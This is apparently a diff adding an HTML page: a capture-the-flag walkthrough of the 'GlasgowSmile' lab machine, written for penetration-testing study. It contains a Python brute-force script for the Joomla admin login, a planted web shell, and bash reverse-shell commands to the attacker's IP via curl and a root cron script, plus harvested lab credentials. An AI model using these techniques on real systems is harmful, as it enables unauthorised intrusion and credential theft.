@@ -1,0 +1,456 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Play GlasgowSmile</h1>
+    <p class="text">Difficulty : Hard | CommunityRating : Hard | MyRating : MediumHard</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 67:34:48:1f:25:0e:d7:b3:ea:bb:36:11:22:60:8f:a1 (RSA)
+|   256 4c:8c:45:65:a4:84:e8:b1:50:77:77:a9:3a:96:06:31 (ECDSA)
+|_  256 09:e9:94:23:60:97:f7:20:cc:ee:d6:c1:9b:da:18:8e (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.38 (Debian)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+<p class="text">HTTP is open on the target machine.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/glasgowsmile/1.png' %}" alt="">
+    <p class="text">There is no interesting information. So, let's start http enumeration.</p>
+</div>
+
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP -t 50</u>
+===============================================================
+/index.html           (Status: 200) [Size: 125]
+/joomla               (Status: 301) [Size: 317] [--&gt; http://192.168.123.79/joomla/]
+/server-status        (Status: 403) [Size: 279]</code></pre></div>
+
+<p class="text">Gobuster output famous CMS joomla. Let's dig into the dir joomla with feroxbuster.</p>
+
+
+<div class="code-box"><pre><code>└─$ <u>feroxbuster -u http://$IP/joomla > ferox</u>
+└─$ cat ferox
+└─$ cat ferox | grep -Evi 'css|images|png|ico|js|gif|0l' | grep 200
+200      GET       52l       84w     1622c http://192.168.119.79/joomla/plugins/user/contactcreator/contactcreator.xml
+200      GET       45l       79w     1419c http://192.168.119.79/joomla/plugins/search/tags/tags.xml
+200      GET       57l       93w     1711c http://192.168.119.79/joomla/plugins/search/contacts/contacts.xml
+...
+200      GET        7l       23w      383c http://192.168.119.79/joomla/administrator/help/helpsites.xml
+200      GET        2l        2w       13c http://192.168.119.79/joomla/administrator/logs/error.php
+200      GET      108l      321w     4929c http://192.168.119.79/joomla/administrator/index.php
+</code></pre></div>
+
+<p class="text">Though I filtered several extensions and 0 length pages, it returned tons of files. But I found there are several xml files, library dir, and plugin dir. Therefore, I'll browse them manually and check if there is leaked sensitive information or vulnerabile plugins.</p>
+<p class="text">However, there were no exploitable stuff. It's possible to have vulnerability joomla itself. So, I researched <u>joomla version recon github</u> on google and found <a href="https://github.com/OWASP/joomscan">enum tool for joomla</a>.</p>
+<p class="text">Let's try it.</p>
+
+<div class="code-box"><pre><code>└─$ git clone https://github.com/OWASP/joomscan.git
+└─$ cd joomscan
+└─$ perl joomscan.pl
+    ____  _____  _____  __  __  ___   ___    __    _  _ 
+   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
+  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
+  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
+    (1337.today)
+   
+    --=[OWASP JoomScan
+    +---++---==[Version : 0.0.7
+    +---++---==[Update Date : [2018/09/23]
+    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
+    --=[Code name : Self Challenge
+    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
+
+
+   Usage: 
+        joomscan.pl <target>
+    joomscan.pl -u http://target.com/joomla
+      joomscan.pl -m targets.txt
+   
+   
+      Options: 
+    joomscan.pl --help</code></pre></div>
+
+
+<div class="code-box"><pre><code>└─$ perl joomscan.pl -u http://192.168.123.79/joomla/administrator/
+
+[+] Detecting Joomla Version
+[++] Joomla 3.7.3</code></pre></div>
+
+<p class="text">Though it returned several information, there was no new info.</p>
+
+
+
+<h2 class="subtitle">Foothold</h2>
+<p class="text">Now I enumerated the target's website fully, and there was no exploitable vulnerabilities. Therefore, the only choice I can take is password burte forcing.</p>
+<p class="text">However, it's not feasible to brute force all possible patterns. There fore, we have to create our wordlists. For that purpose, I used tool <u>cewl</u>.</p>
+
+
+<div class="code-box"><pre><code>└─$ cewl http://192.168.119.79/joomla/administrator/ -d 4 -m 5 -w $PWD/words.txt</code></pre></div>
+<p class="text">CeWL crawls websites to extract targeted words and generate custom wordlists for password-cracking, reconnaissance, and offline cracking workflows efficiently reliably. </p>
+<p class="text">Let's observe the outputs.</p>
+
+<div class="code-box"><pre><code>└─$ cat words.txt
+Joker
+Email
+Content
+Username
+Password
+laughing
+Forgot
+Begin
+...</code></pre></div>
+<p class="text">Though it's not bad list, there are many "shouldn't be" username. So, I will use this wordlist as password list, and create new wordlist with possible username.</p>
+<p class="text">I assume 12 words below are candidates.</p>
+<div class="code-box"><pre><code>Joker
+Username
+Arthur
+username
+Smile
+Glasgow
+Asylum
+Arkham
+Gotham
+Murray
+Administrator
+Joomla</code></pre></div>
+
+<p class="text">We created wordlist. Next I will write python code.</p>
+
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/glasgowsmile/2.png' %}" alt="">
+    <p class="text">Before, feroxbuster found the path to admin page. We can grab login request from this page and extract cookies and request data, and create simple python file which brute force login form.</p>
+</div>
+<div class="img">
+    <img src="{% static 'EthHack/images/glasgowsmile/3.png' %}" alt="">
+    <p class="text">I first launched burpsuite and send login request. Then, extracted data and cookies, which are required for creating brute force code.</p>
+</div>
+<p class="text">I used python code below :</p>
+<div class="code-box"><pre><code>import requests
+import sys
+
+s = requests.session()
+
+
+url = 'http://192.168.123.79/joomla/administrator/'
+cookies = {
+    '6821ee9ea803cd64e2920ca203163e81': 'm6pqkuakdrc9p89ogecu417744'
+}
+s.cookies.update(cookies)
+
+unames = ['Joker','Username','Arthur','username','Smile','Glasgow','Asylum','Arkham','Gotham','Murray','Administrator','Joomla']
+with open('/home/kali/tempo/cewl2.txt',mode='r',encoding='utf-8', errors='ignore') as f:
+    words = [line.strip('\n') for line in f]
+
+length = len(unames)
+
+i = 1
+for uname in unames:
+    print(f"{i}/{length}\n")
+    for y in words:
+        data = {
+            'username' : uname,
+            'passwd' : y,
+            'option' : 'com_login',
+            'task' : 'login',
+            'return' : 'aW5kZXgucGhw',
+            '080ca6a2ec4ebe10b49f316e6796cd85' : '1'
+        }
+        try:
+            resp = s.post(url, data=data, timeout=10, allow_redirects=False)
+        except requests.RequestException as e:
+            print(resp.content)
+            print('request error : ',e)
+        print(resp.status_code)
+        print(len(resp.content))
+
+        if int(len(resp.content)) != 5222:
+            print()
+            print(f"Found Creds! : {uname} : {y}")
+            sys.exit()
+    i += 1</code></pre></div>
+<p class="text">This code returned messy outputs, but I intended to check response lenght and status code for check outputs manually. Also, I knew that the wrong credential input returns 5222 lenght response during test, so I set len(resp.content) != 5222.</p>
+
+<p class="text">Then, run it.</p>
+
+<div class="code-box"><pre><code>└─$ python3 joomla_brute.py
+...
+5222
+200
+5222
+303
+0
+
+Found Creds! : <u>Joomla : Gotham</u></code></pre></div>
+
+<p class="text">After waiting for a while, this cred <u>Joomla:Gotham</u> returned 303 response. We got credential.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/glasgowsmile/4.png' %}" alt="">
+    <p class="text">I could logon with Joomla:Gotham. Then, I have to find a way to get reverse shell.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/glasgowsmile/5.png' %}" alt="">
+    <p class="text">Navigating to Extensions -> Templates -> Templates, I found interesting files.</p>
+</div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/glasgowsmile/6.png' %}" alt="">
+    <img src="{% static 'EthHack/images/glasgowsmile/7.png' %}" alt="">
+</div>
+
+<p class="text">I replaced php code with simple web-shell code. After saving it, I pressed bottom left button <u>view site</u> and added parameter cmd=id to the url.</p>
+<p class="text">It returned username www-data. So, we can get reverse shell using this page.</p>
+
+<div class="code-box"><pre><code>└─$ <u>nc -lvnp 4444</u>
+listening on [any] 4444 ...
+
+└─$ <u>curl -G http://192.168.123.79/joomla/ --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.45.199/4444 0>&1'"</u>
+
+
+└─$ nc -lvnp 4444  
+listening on [any] 4444 ...
+connect to [192.168.45.199] from (UNKNOWN) [192.168.123.79] 57382
+bash: cannot set terminal process group (544): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@glasgowsmile:/var/www/html/joomla$ </code></pre></div>
+
+<p class="text">We got reverse shell with www-data user.</p>
+
+<h2 class="subtitle">Lateral Movement</h2>
+<div class="code-box"><pre><code>script /dev/null -c /bin/bash
+Script started, output log file is '/dev/null'.
+$ ^Z
+[1]+  Stopped                 nc -lnvp 443
+
+$ stty raw -echo; fg
+nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen</code></pre></div>
+
+<p class="text">After make this connection stable using the code above, I started enumeration.</p>
+
+<div class="code-box"><pre><code>www-data@glasgowsmile:/var/www/html/joomla$ ls /home
+abner  penguin  <u>rob</u></code></pre></div>
+
+<p class="text">I found three users on home directory.</p>
+
+<div class="code-box"><pre><code>www-data@glasgowsmile:/var/www/html/joomla$ cat configuration.php | grep password -5
+        public $debug = '0';
+        public $debug_lang = '0';
+        public $dbtype = 'mysqli';
+        public $host = 'localhost';
+        public $user = 'joomla';
+        public $password = 'babyjoker';
+        public $db = 'joomla_db';
+        public $dbprefix = 'jnqcu_';
+        public $live_site = '';
+        public $secret = 'fNRyp6KO51013435';
+        public $gzip = '0';</code></pre></div>
+
+        <p class="text">Also, the file configuration.php has mysql credential. Let's read the databases.</p>
+
+        <div class="code-box"><pre><code>www-data@glasgowsmile:/var/www/html/joomla$ <u>mysql -u joomla -pbabyjoker</u>
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 1301
+Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> </code></pre></div>
+
+<div class="code-box"><pre><code>MariaDB [(none)]> <u>show databases;</u>
++--------------------+
+| Database           |
++--------------------+
+| batjoke            |
+| information_schema |
+| joomla_db          |
+| mysql              |
+| performance_schema |
++--------------------+
+5 rows in set (0.001 sec)
+
+MariaDB [(none)]> <u>use batjoke</u></code></pre></div>
+
+
+<div class="code-box"><pre><code>MariaDB [batjoke]> <u>show tables;</u>
++-------------------+
+| Tables_in_batjoke |
++-------------------+
+| equipment         |
+| taskforce         |
++-------------------+
+2 rows in set (0.000 sec)
+
+MariaDB [batjoke]> <u>select * from taskforce;</u>
++----+---------+------------+---------+----------------------------------------------+
+| id | type    | date       | name    | pswd                                         |
++----+---------+------------+---------+----------------------------------------------+
+|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
+|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
+|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
+|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
+|  6 | Soldier | 2020-06-14 | <u>rob</u>     | <u>Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/</u> |
+|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
++----+---------+------------+---------+----------------------------------------------+
+6 rows in set (0.000 sec)</code></pre></div>
+
+<p class="text">This database batjoke > taskforce has base64 encoded string of user <u>rob</u>. It's worth decoding it.</p>
+
+<div class="code-box"><pre><code>└─$ echo 'Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/' | base64 -d
+<u>???AllIHaveAreNegativeThoughts???</u></code></pre></div>
+
+<p class="text">This might be a password for user rob.</p>
+
+<div class="code-box"><pre><code>www-data@glasgowsmile:/var/www/html/joomla$ su rob
+Password: 
+rob@glasgowsmile:/var/www/html/joomla$ </code></pre></div>
+<p class="text">Yes, it was. We got rob user.</p>
+
+
+<h2 class="subtitle">Second Lateral Movement</h2>
+
+<p class="text">For more stable connection, let's connect via ssh. I could use ssh-keygen command with rob.</p>
+
+<div class="code-box"><pre><code>└─$ cat ~/.ssh/id_xxxxxxxx.pub
+<u class="green">Copy the output. If you haven't created id_rsa, use command 'ssh-keygen'</u>
+rob@glasgowsmile:~$ mkdir .ssh
+rob@glasgowsmile:~/.ssh$ echo 'output' > authorized_keys</code></pre></div>
+
+<p class="text">Then, we can ssh.</p>
+
+<div class="code-box"><pre><code>└─$ ssh -i ~/.ssh/id_ed25519 rob@192.168.123.79
+Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+rob@glasgowsmile:~$ </code></pre></div>
+
+<div class="code-box"><pre><code>rob@glasgowsmile:~$ ls
+<u>Abnerineedyourhelp</u>  howtoberoot  local.txt  user.txt            
+rob@glasgowsmile:~$ cat Abnerineedyourhelp                      
+Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."                                    
+Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==                        
+rob@glasgowsmile:~$ </code></pre></div>
+
+<p class="text">On the home dir, there is file named <u>'Abner...'</u>, which is another user on the machine. Also this file contains texts encoded with rot1.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/glasgowsmile/8.png' %}" alt="">
+    <p class="text">Decoded with <a href="https://rot13.com/">this site</a>, and the result contained base64 text again.</p>
+</div>
+<div class="code-box"><pre><code>└─$ echo 'STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==' | base64 -d
+<u>I33hope99my0death000makes44more8cents00than0my0life0</u> </code></pre></div>
+
+<p class="text">Again, we could use this for password.</p>
+<div class="code-box"><pre><code>rob@glasgowsmile:~$ su abner
+Password:                                                       
+abner@glasgowsmile:/home/rob$</code></pre></div>
+
+
+<h2 class="subtitle">Third Lateral Movement</h2>
+<p class="text">Enumerating user file retuned interesting file.</p>
+
+<div class="code-box"><pre><code>abner@glasgowsmile:/home/rob$ find / -user abner 2>/dev/null | grep -Ev proc                                                    
+/home/abner
+/home/abner/user2.txt
+/home/abner/.bashrc
+/home/abner/.Xauthority
+/home/abner/.bash_logout
+/home/abner/.profile
+/home/abner/.ssh
+/home/abner/.ssh/known_hosts
+/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip</code></pre></div>
+
+<p class="text">/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip may have base64-encoded password again. Let's read this.</p>
+
+<div class="code-box"><pre><code>abner@glasgowsmile:~$ cp /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip ~/dear.zip
+abner@glasgowsmile:~$ ls
+dear.zip  user2.txt</code></pre></div>
+<p class="text"><u>※You cannot unzip this file under the dir /var/www/joomla2/administrator/manifests/files because of directory permission. Copy this file under abner's home directory.</u></p>
+<div class="code-box"><pre><code></code></pre></div>
+<div class="code-box"><pre><code>abner@glasgowsmile:~$ unzip dear.zip
+Archive:  dear.zip
+[dear.zip] dear_penguins password: 
+  inflating: dear_penguins   </code></pre></div>
+
+  <p class="text">I could use abner's password for unzip.</p>
+  <div class="code-box"><pre><code>abner@glasgowsmile:~$ cat dear_penguins
+My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
+<u>scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz</u></code></pre></div>
+
+<p class="text">We got password for penguin, this time not base64-encoded.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<div class="code-box"><pre><code>penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
+total 332
+drwxr--r-- 2 penguin penguin   4096 Jun 16  2020 .
+drwxr-xr-x 4 penguin penguin   4096 Aug 25  2020 ..
+-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find
+-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
+-rwxr-xr-x 1 penguin root       612 Jun 16  2020 .trash_old
+-rw-r----- 1 penguin penguin     32 Aug 25  2020 user3.txt</code></pre></div>
+
+<p class="text">Under the home dir, there is a executable file with root user. Let's check this file is run by root user using pspy64.</p>
+
+<div class="code-box"><pre><code>└─$ python3 -m http.server 8000                 
+penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ wget http://192.168.45.199:8000/pspy64
+--2025-10-26 07:39:01--  http://192.168.45.199:8000/pspy64
+Connecting to 192.168.45.199:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: 'pspy64'
+
+pspy64          100%[=======>]   2.96M   680KB/s    in 4.5s    
+
+2025-10-26 07:39:06 (673 KB/s) - 'pspy64' saved [3104768/3104768]</code></pre></div>
+
+<div class="code-box"><pre><code>penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ chmod +x pspy64
+penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ./pspy64
+...
+2025/10/25 13:05:00 CMD: UID=0     PID=2      | 
+2025/10/25 13:05:00 CMD: UID=0     PID=1      | /sbin/init 
+2025/10/25 13:05:01 CMD: UID=0     PID=1813   | /usr/sbin/CRON -f                                                             
+2025/10/25 13:05:01 CMD: UID=0     PID=1814   | /usr/sbin/CRON -f                                                             
+2025/10/25 13:05:01 CMD: UID=0     PID=1815   | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old</code></pre></div>
+
+<p class="text">The file .trash_old is run by root user. Also the file owner is penguin user. Therefore, we can execute arbitrary command using this file with root privilege.</p>
+
+<div class="code-box"><pre><code>echo 'bash -c "bash -i >& /dev/tcp/192.168.45.199/4444 0>&1"' > .trash_old</code></pre></div>
+<p class="text">Then, open port 4444 and wait reverse connection.</p>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.199] from (UNKNOWN) [192.168.123.79] 57388
+bash: cannot set terminal process group (1871): Inappropriate ioctl for device
+bash: no job control in this shell
+root@glasgowsmile:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)</code></pre></div>
+<p class="text">Waiting a minute, reverse shell established with root user. You can find proof.txt under /root dir and local.txt under /home/rob.</p>
+
+</body>
+</html>
